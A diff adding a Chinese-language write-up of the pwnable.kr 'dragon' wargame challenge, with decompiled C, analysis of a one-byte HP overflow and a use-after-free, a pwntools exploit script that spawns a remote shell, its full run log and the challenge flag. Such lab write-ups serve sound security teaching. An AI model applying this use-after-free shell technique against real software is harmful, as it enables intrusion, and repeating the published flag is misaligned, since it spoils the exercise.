@@ -14400,3 +14400,506 @@ Have you ever saw an example of utilizing [n] format character?? :(
 
 ------
 
+### dragon
+
+这是**Pwnable.kr**的第二十九个挑战`dragon`，来自**[Rookiss]**部分。
+
+```bash
+I made a RPG game for my little brother.
+But to trick him, I made it impossible to win.
+I hope he doesn't get too angry with me :P!
+
+Author : rookiss
+Download : http://pwnable.kr/bin/dragon
+
+Running at : nc pwnable.kr 9004
+```
+
+这题只给出一个二进制文件，让我们来看看。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ file ./dragon   
+./dragon: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a7a354f09b431b4523192272c448af835b35ae9b, not stripped
+                                                                                                          
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ checksec --file=./dragon   
+[*] '/home/tyd/ctf/pwn/pwnable.kr/dragon'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开二进制文件`dragon`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  puts("Welcome to Dragon Hunter!");
+  PlayGame();
+  return 0;
+}
+```
+
+双击`PlayGame()`函数查看详情， `$eax`寄存器中的变量`result`用来存储该函数的返回值。外层的无限循环 `while (1)`表示游戏将一直运行直到满足跳出循环的条件。内层的无限循环 `while (1)` 使用 `puts()` 函数输出一条消息，提示用户选择英雄，两个选项分别是牧师 `[1] Priest` 和骑士 `[2] Knight`。调用 `GetChoice()` 函数获取用户的选择，并将结果存储在 `result` 变量中。如果用户输入了`1`或`2`，则执行`FightDragon(result)`函数来与龙进行战斗。如果用户选择其他选项（`result` 不等于`1` 且不等于`2`），则跳出内层`while`循环。如果`result` 不等于`3` 则会跳出外层`while`循环结束程序。因此我们需要输入`3`进入隐藏关卡`SecretLevel()`。
+
+```c
+int PlayGame()
+{
+  int result; // eax
+
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      puts("Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight");
+      result = GetChoice();
+      if ( result != 1 && result != 2 )
+        break;
+      FightDragon(result);
+    }
+    if ( result != 3 )
+      break;
+    SecretLevel();
+  }
+  return result;
+}
+```
+
+双击`SecretLevel()`函数查看详情：该函数存在宝藏 `system("/bin/sh");`。函数开始处声明了一个长度为 `10` 的字符数组 `s1`，用于存储用户输入的密码。使用 `__isoc99_scanf` 函数将用户输入的字符串存储在 `s1` 中，最多接受  `10 ` 个字符。使用 `strcmp` 函数比较用户输入的密码 `s1` 是否与`"Nice_Try_But_The_Dragons_Won't_Let_You!"` 相同。如果不相同，则输出`Wrong!`并调用`exit(-1);`退出程序。如果用户输入的密码与预设密码相同，则使用 `system` 函数执行命令 `"/bin/sh"`，启动一个`shell`。然而，`s1`最多只能接受`10`个字节，而预设密码有`39`个字节。看起来只能打龙啦？！
+
+```c
+unsigned int SecretLevel()
+{
+  char s1[10]; // [esp+12h] [ebp-16h] BYREF
+  unsigned int v2; // [esp+1Ch] [ebp-Ch]
+
+  v2 = __readgsdword(0x14u);
+  printf("Welcome to Secret Level!\nInput Password : ");
+  __isoc99_scanf("%10s", s1);
+  if ( strcmp(s1, "Nice_Try_But_The_Dragons_Won't_Let_You!") )
+  {
+    puts("Wrong!\n");
+    exit(-1);
+  }
+  system("/bin/sh");
+  return __readgsdword(0x14u) ^ v2;
+}
+```
+
+不急着做题，其他函数也顺带分析下吧。双击`GetChoice()`函数查看详情。整型数组`v1`用来存储用户输入的选项，注释中的 `[esp+1Ch] [ebp-Ch] BYREF` 表示该数组是通过引用传递（By Reference）的方式使用。 `__isoc99_scanf("%d", v1)` 函数从用户输入中读取一个整数，并将其存储在数组 `v1` 的第一个元素中（`v1[0]`）。在读取用户输入后，使用 `getchar()` 函数读取剩余的字符，直到读取到换行符（ASCII 值为 10）；这是为了清除输入缓冲区中的额外字符，以防止它们影响后续的输入。`GetChoice()`函数返回数组 `v1` 的第一个元素（`v1[0]`），即用户输入的选择作为函数的返回值。
+
+```c
+int GetChoice()
+{
+  int v1[3]; // [esp+1Ch] [ebp-Ch] BYREF
+
+  __isoc99_scanf("%d", v1);
+  while ( getchar() != 10 )
+    ;
+  return v1[0];
+}
+```
+
+回到`PlayGame()`函数，双击`FightDragon()`函数查看详情，可以发现母龙血厚攻击低，幼龙血薄伤害高，牧师生命值`42`法力值`50`，骑士生命值`50`没蓝。龙的生命值保存在`1`个字节中，意味着龙最大生命值是`127`，回血的时候存在溢出漏洞。
+
+```c
+void __cdecl FightDragon(int a1)
+{
+  char v1; // al
+  int v2; // [esp+10h] [ebp-18h]
+  _DWORD *ptr; // [esp+14h] [ebp-14h]  // 指向_DWORD类型的指针ptr
+  _DWORD *v4; // [esp+18h] [ebp-10h]   // 指向_DWORD类型的指针v4
+  void *v5; // [esp+1Ch] [ebp-Ch]      // 指向void类型的指针v5
+
+  ptr = malloc(0x10u);  // 分配16个字节的内存空间
+  v4 = malloc(0x10u);   // 分配16个字节的内存空间
+  v1 = Count++;         // 全局变量或静态变量Count可能用于记录战斗的次数
+  if ( (v1 & 1) != 0 )  // 按位与运算检查Count的最低位是否为1, 最低位为1则表示奇数次战斗
+  {
+    v4[1] = 1;                // 将v4指针的第二个_DWORD元素设置为1
+    *((_BYTE *)v4 + 8) = 80;  // 将v4指针的第一个_BYTE元素设置为80, 即龙的生命值
+    *((_BYTE *)v4 + 9) = 4;   // 将v4指针的第二个_BYTE元素设置为4, 即龙每次回复的生命值
+    v4[3] = 10;               // 将v4指针的第四个_DWORD元素设置为10, 即龙的攻击力
+    *v4 = PrintMonsterInfo;   // 将PrintMonsterInfo函数的地址赋给v4指针的第一个_DWORD元素
+    puts("Mama Dragon Has Appeared!");  // 出现了一只母龙, 可以看出母龙生命值多但是攻击力低
+  }
+  else  //  Count的最低位不为1, 则表示为偶数次战斗
+  {
+    v4[1] = 0;                // 将v4指针的第二个_DWORD元素设置为0
+    *((_BYTE *)v4 + 8) = 50;  // 将v4指针的第一个_BYTE元素设置为50, 即龙的生命值
+    *((_BYTE *)v4 + 9) = 5;   // 将v4指针的第二个_BYTE元素设置为5, 即龙每次回复的生命值
+    v4[3] = 30;               // 将v4指针的第四个_DWORD元素设置为30, 即龙的攻击力
+    *v4 = PrintMonsterInfo;   // 将PrintMonsterInfo函数的地址赋给v4指针的第一个_DWORD元素
+    puts("Baby Dragon Has Appeared!");  // 出现了一只幼龙, 可以看出幼龙攻击力高但是生命值少
+  }
+  if ( a1 == 1 )   // 如果a1等于1, 说明用户选择成为牧师
+  {
+    *ptr = 1;                 // 将ptr指针的第一个_DWORD元素设置为1
+    ptr[1] = 42;              // 将ptr指针的第二个_DWORD元素设置为42, 牧师的生命值
+    ptr[2] = 50;              // 将ptr指针的第三个_DWORD元素设置为50, 牧师的最大法力值
+    ptr[3] = PrintPlayerInfo; // 将PrintPlayerInfo函数的地址赋给ptr指针的第四个_DWORD元素
+    v2 = PriestAttack((int)ptr, v4); // 调用PriestAttack()函数, 传递ptr和v4的地址作为参数, 并将返回值存储在v2中
+  }
+  else  // 如果a1不等于1而等于2, 说明用户选择成为骑士
+  {
+    if ( a1 != 2 )
+      return;
+    *ptr = 2;                 // 将ptr指针的第一个_DWORD元素设置为2
+    ptr[1] = 50;              // 将ptr指针的第二个_DWORD元素设置为50, 骑士的生命值
+    ptr[2] = 0;               // 将ptr指针的第三个_DWORD元素设置为0, 骑士没有法力值
+    ptr[3] = PrintPlayerInfo; // 将PrintPlayerInfo函数的地址赋给ptr指针的第四个_DWORD元素
+    v2 = KnightAttack((int)ptr, v4); // 调用PriestAttack()函数, 传递ptr和v4的地址作为参数, 并将返回值存储在v2中
+  }
+  if ( v2 )  // 如果v2的值为真（非零即真）表示战斗胜利
+  {
+    puts("Well Done Hero! You Killed The Dragon!");
+    puts("The World Will Remember You As:");
+    v5 = malloc(0x10u);         // 分配16个字节的内存空间, 用于存储英雄的名称
+    __isoc99_scanf("%16s", v5); // 从用户输入中读取最多16个字节的字符串, 并将其存储在v5指向的内存中
+    puts("And The Dragon You Have Defeated Was Called:");
+    ((void (__cdecl *)(_DWORD *))*v4)(v4); // 调用PrintMonsterInfo函数, 传递v4的地址作为参数以打印龙的信息
+  }
+  else
+  {
+    puts("\nYou Have Been Defeated!");
+  }
+  free(ptr);  // 释放之前分配的内存
+}
+```
+
+双击`PrintPlayerInfo()`函数查看详情，打印玩家信息。
+
+```c
+int __cdecl PrintPlayerInfo(int *a1)
+{
+  int result; // eax
+
+  if ( *a1 == 1 )
+    return printf(Str_Priest, a1[1], a1[2]);
+  result = *a1;
+  if ( *a1 == 2 )
+    result = printf(Str_Knight, a1[1]);
+  return result;
+}
+```
+
+回到`FightDragon()`函数，双击`PriestAttack()`函数查看详情，我们可以看到牧师玩家打龙的技能：`1`技能Holy Bolt耗蓝`10`造成`20`伤害，`2`技能Clarity能回复满法力值，`3`技能HolyShield耗蓝`25`暂时无敌。正如前文所述，龙的生命值保存在`1`个字节中，意味着龙最大生命值是`127`，回血的时候存在溢出漏洞。我们通过技能HolyShield和Clarity，可以让龙血条溢出直接暴毙。
+
+```c
+int __cdecl PriestAttack(int a1, void *ptr)
+{
+  int v2; // eax
+
+  do
+  {
+    (*(void (__cdecl **)(void *))ptr)(ptr);    // 调用ptr指针所指向的函数并传递ptr作为参数, 用于打印龙的信息
+    (*(void (__cdecl **)(int))(a1 + 12))(a1);  // 调用a1所指向的函数, 并传递a1作为参数, 用于打印牧师玩家的信息
+    v2 = GetChoice();  // 调用GetChoice()函数获取玩家选择的操作, 并将结果存储在变量v2中
+    switch ( v2 )
+    {
+      case 2:  // 如果用户选择的操作是2, 表示使用了"Clarity"技能
+        puts("Clarity! Your Mana Has Been Refreshed");
+        *(_DWORD *)(a1 + 8) = 50;  // 将a1偏移量为8的位置（牧师的法力值）设置为50, 推测该技能是用来回复法力值的
+        printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));  // 打印龙对牧师造成的伤害
+        *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);  // 将a1偏移量为4的位置（牧师的生命值）减去龙对牧师造成的伤害
+        printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));  // 打印龙回复的生命值
+        *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);  // 将ptr偏移量为8的位置（龙的生命值）加上龙回复的生命值
+        goto LABEL_11;  // 跳转到LABEL_11处执行代码
+      case 3:  // 如果用户选择的操作是3, 表示使用了"HolyShield"技能, 不会掉血
+        if ( *(int *)(a1 + 8) > 24 )  // 检查牧师的法力值是否大于24, 推测该技能耗蓝25法力值
+        {
+          puts("HolyShield! You Are Temporarily Invincible...");
+          printf("But The Dragon Heals %d HP!\n", *((char *)ptr + 9));   // 打印龙回复的生命值
+          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);  // 将ptr偏移量为8的位置（龙的生命值）加上龙回复的生命值
+          *(_DWORD *)(a1 + 8) -= 25;  // 将a1偏移量为8的位置（牧师的法力值）减去25
+          goto LABEL_11;  // 跳转到LABEL_11处执行代码
+        }
+        break;
+      case 1:  // 如果用户选择的操作是1, 表示使用了"Holy Bolt"技能
+        if ( *(int *)(a1 + 8) > 9 )  // 检查牧师的法力值是否大于9, 推测该技能耗蓝10法力值
+        {
+          printf("Holy Bolt Deals %d Damage To The Dragon!\n", 20);  // 打印牧师玩家对龙造成的20点伤害
+          *((_BYTE *)ptr + 8) -= 20;  // 将ptr偏移量为8的位置（龙的生命值）减去20
+          *(_DWORD *)(a1 + 8) -= 10;  // 将a1偏移量为8的位置（牧师的法力值）减去10
+          printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));  // 打印龙对牧师造成的伤害
+          *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3); // 将a1偏移量为4的位置（牧师的生命值）减去龙对牧师造成的伤害
+          printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));  // 打印龙回复的生命值
+          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);  // 将ptr偏移量为8的位置（龙的生命值）加上龙回复的生命值
+          goto LABEL_11;  // 跳转到LABEL_11处执行代码
+        }
+        break;
+      default:
+        goto LABEL_11;
+    }
+    puts("Not Enough MP!");
+LABEL_11:
+    if ( *(int *)(a1 + 4) <= 0 )  // 检查牧师的生命值是否小于等于0, 如果是则表示牧师被击败返回0
+    {
+      free(ptr);  // 释放ptr指针指向的内存空间
+      return 0;
+    }
+  }
+  while ( *((char *)ptr + 8) > 0 );  // 判断龙的生命值是否大于0, 如果是则继续执行循环, 否则表示龙已被击败并返回1
+  free(ptr);  // 释放ptr指针指向的内存空间
+  return 1;
+}
+```
+
+回到`FightDragon()`函数，双击`KnightAttack()`函数查看详情，这应该是骑士玩家打龙的函数，很明显骑士没有胜算。1技能Crash造成`20`点伤害，`2`技能Frenzy消耗`20`生命值造成`40`点伤害。
+
+```c
+int __cdecl KnightAttack(int a1, void *ptr)
+{
+  int v2; // eax
+
+  do
+  {
+    (*(void (__cdecl **)(void *))ptr)(ptr);    // 调用ptr指针所指向的函数并传递ptr作为参数, 用于打印龙的信息
+    (*(void (__cdecl **)(int))(a1 + 12))(a1);  // 调用a1所指向的函数, 并传递a1作为参数, 用于打印骑士玩家的信息
+    v2 = GetChoice();  // 调用GetChoice()函数获取玩家选择的操作, 并将结果存储在变量v2中
+    if ( v2 == 1 )  // 如果用户选择的操作是1, 表示使用了"Crash"技能
+    {
+      printf("Crash Deals %d Damage To The Dragon!\n", 20);  // 打印骑士玩家对龙造成的20点伤害
+      *((_BYTE *)ptr + 8) -= 20;  // 将ptr偏移量为8的位置（龙的生命值）减去 20
+      printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));  // 打印龙对骑士造成的伤害
+      *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);  // 将a1偏移量为4的位置（骑士的生命值）减去龙对骑士造成的伤害
+      printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));  // 打印龙回复的生命值
+      *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);  // 将ptr偏移量为 8 的位置（龙的生命值）加上龙回复的生命值
+    }
+    else if ( v2 == 2 )  // 如果用户选择的操作是2, 表示使用了"Frenzy"技能
+    {
+      printf("Frenzy Deals %d Damage To The Dragon!\n", 40);  // 打印骑士玩家对龙造成的40点伤害
+      *((_BYTE *)ptr + 8) -= 40;  // 将ptr偏移量为8的位置（龙的生命值）减去40
+      puts("But You Also Lose 20 HP...");  // 艹 这是蒙多医生吗？！用技能自己掉血
+      *(_DWORD *)(a1 + 4) -= 20;  // 将 a1 偏移量为4的位置（骑士的生命值）减去20
+      printf("And The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));  // 打印龙对骑士造成的伤害
+      *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);  // 将a1偏移量为4的位置（骑士的生命值）减去龙对骑士造成的伤害
+      printf("Plus The Dragon Heals %d HP!\n", *((char *)ptr + 9));  // 打印龙回复的生命值
+      *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);  // 将ptr偏移量为 8 的位置（龙的生命值）加上龙回复的生命值
+    }
+    if ( *(int *)(a1 + 4) <= 0 )  // 检查骑士的生命值是否小于等于0, 如果是则表示骑士被击败返回0
+    {
+      free(ptr);  // 释放ptr指针指向的内存空间
+      return 0;
+    }
+  }
+  while ( *((char *)ptr + 8) > 0 );  // 判断龙的生命值是否大于0, 如果是则继续执行循环, 否则表示龙已被击败并返回1
+  free(ptr);  // 释放ptr指针指向的内存空间
+  return 1;
+}
+```
+
+审计到这儿，基本可以确定这程序只有成为牧师和隐藏关卡中的`system("/bin/sh");`有用啦。在`FightDragon()`函数结束时，需要注意龙的内存空间已经在`PriestAttack()`函数中释放，但是在战斗胜利时用户输入完英雄姓名后，又调用了`PrintMonsterInfo()`函数打印龙的信息。这里存在`UAF`漏洞，他俩位于同一地址，我们能通过`v5`的值来覆写`v4`指针，所以我们只需要写入`shell`的地址让它调用。
+
+```c
+if ( v2 )  // 如果v2的值为真（非零即真）表示战斗胜利
+{
+  puts("Well Done Hero! You Killed The Dragon!");
+  puts("The World Will Remember You As:");
+  v5 = malloc(0x10u);         // 分配16个字节的内存空间, 用于存储英雄的名称
+  __isoc99_scanf("%16s", v5); // 从用户输入中读取最多16个字节的字符串, 并将其存储在v5指向的内存中
+  puts("And The Dragon You Have Defeated Was Called:");
+  ((void (__cdecl *)(_DWORD *))*v4)(v4); // 调用PrintMonsterInfo函数, 传递v4的地址作为参数以打印龙的信息
+}
+```
+
+`system("/bin/sh");`对应的汇编代码如下：
+
+```assembly
+.text:08048DBF                 mov     dword ptr [esp], offset command ; "/bin/sh"
+.text:08048DC6                 call    _system
+```
+
+编写`Python`代码求解，开局先摆烂，因为面对幼龙没有赢面，死了一条命之后就能遇到母龙，母龙攻击低血量厚回血多，谁不爱呢？！
+
+```bash
+from pwn import *
+
+io = remote('pwnable.kr', 9004)
+shell = 0x8048dbf
+for _ in range(4):
+    io.sendline(b'1')
+for _ in range(4):
+    io.sendline(b'3\n3\n2')
+io.sendline(p32(shell))
+io.interactive()
+```
+
+提交`MaMa, Gandhi was right! :)`即可。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ python dragon.py                                                                                      
+[+] Opening connection to pwnable.kr on port 9004: Done
+[*] Switching to interactive mode
+Welcome to Dragon Hunter!
+Choose Your Hero
+[ 1 ] Priest
+[ 2 ] Knight
+Baby Dragon Has Appeared!
+[ Baby Dragon ] 50 HP / 30 Damage / +5 Life Regeneration.
+[ Priest ] 42 HP / 50 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+Holy Bolt Deals 20 Damage To The Dragon!
+But The Dragon Deals 30 Damage To You!
+And The Dragon Heals 5 HP!
+[ Baby Dragon ] 35 HP / 30 Damage / +5 Life Regeneration.
+[ Priest ] 12 HP / 40 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+Holy Bolt Deals 20 Damage To The Dragon!
+But The Dragon Deals 30 Damage To You!
+And The Dragon Heals 5 HP!
+
+You Have Been Defeated!
+Choose Your Hero
+[ 1 ] Priest
+[ 2 ] Knight
+Mama Dragon Has Appeared!
+[ Mama Dragon ] 80 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 42 HP / 50 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+HolyShield! You Are Temporarily Invincible...
+But The Dragon Heals 4 HP!
+[ Mama Dragon ] 84 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 42 HP / 25 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+HolyShield! You Are Temporarily Invincible...
+But The Dragon Heals 4 HP!
+[ Mama Dragon ] 88 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 42 HP / 0 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+Clarity! Your Mana Has Been Refreshed
+But The Dragon Deals 10 Damage To You!
+And The Dragon Heals 4 HP!
+[ Mama Dragon ] 92 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 32 HP / 50 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+HolyShield! You Are Temporarily Invincible...
+But The Dragon Heals 4 HP!
+[ Mama Dragon ] 96 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 32 HP / 25 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+HolyShield! You Are Temporarily Invincible...
+But The Dragon Heals 4 HP!
+[ Mama Dragon ] 100 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 32 HP / 0 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+Clarity! Your Mana Has Been Refreshed
+But The Dragon Deals 10 Damage To You!
+And The Dragon Heals 4 HP!
+[ Mama Dragon ] 104 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 22 HP / 50 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+HolyShield! You Are Temporarily Invincible...
+But The Dragon Heals 4 HP!
+[ Mama Dragon ] 108 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 22 HP / 25 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+HolyShield! You Are Temporarily Invincible...
+But The Dragon Heals 4 HP!
+[ Mama Dragon ] 112 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 22 HP / 0 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+Clarity! Your Mana Has Been Refreshed
+But The Dragon Deals 10 Damage To You!
+And The Dragon Heals 4 HP!
+[ Mama Dragon ] 116 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 12 HP / 50 MP
+    [ 1 ] Holy Bolt [ C : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+HolyShield! You Are Temporarily Invincible...
+But The Dragon Heals 4 HP!
+[ Mama Dragon ] 120 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 12 HP / 25 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+HolyShield! You Are Temporarily Invincible...
+But The Dragon Heals 4 HP!
+[ Mama Dragon ] 124 HP / 10 Damage / +4 Life Regeneration.
+[ Priest ] 12 HP / 0 MP
+    [ 1 ] Holy Bolt [ Cost : 10 MP ]
+        Deals 20 Damage.
+    [ 2 ] Clarity [ Cost : 0 MP ]
+        Refreshes All Mana.
+    [ 3 ] HolyShield [ Cost: 25 MP ]
+        You Become Temporarily Invincible.
+Clarity! Your Mana Has Been Refreshed
+But The Dragon Deals 10 Damage To You!
+And The Dragon Heals 4 HP!
+Well Done Hero! You Killed The Dragon!
+The World Will Remember You As:
+And The Dragon You Have Defeated Was Called:
+$ cat flag
+MaMa, Gandhi was right! :)
+```
+
+------
+
